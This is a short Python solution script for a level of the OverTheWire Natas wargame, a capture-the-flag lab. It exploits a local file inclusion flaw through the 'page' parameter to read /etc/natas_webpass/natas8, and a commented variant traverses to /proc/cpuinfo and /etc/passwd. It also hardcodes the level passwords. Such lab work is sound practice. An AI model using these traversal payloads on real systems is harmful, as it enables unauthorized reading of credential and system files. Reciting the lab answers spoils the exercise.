#!/usr/bin/env python
#Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 

# <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

import requests

def loginWebSite():
    
    username = 'natas7'
    password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
    
    #Extract Password - DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
    siteUrl = 'http://{}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'.format(username)    #DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
    #siteUrl = 'http://{}.natas.labs.overthewire.org/index.php?page=../../../../../proc/cpuinfo'.format(username)   #/etc/passwd
    session = requests.session()
    response = session.post(siteUrl, auth = (username, password))
    #content = re.findall(' password for (.*)', response)[0]
    print(response.text)


def loginNextchallenge():
    username = 'natas8'
    password = 'DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe'

    siteUrl = 'http://{}.natas.labs.overthewire.org/'.format(username)
    
    r = requests.get(siteUrl, auth = (username, password))
    print(r.text)

loginWebSite()    
#loginNextchallenge()      

# <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->  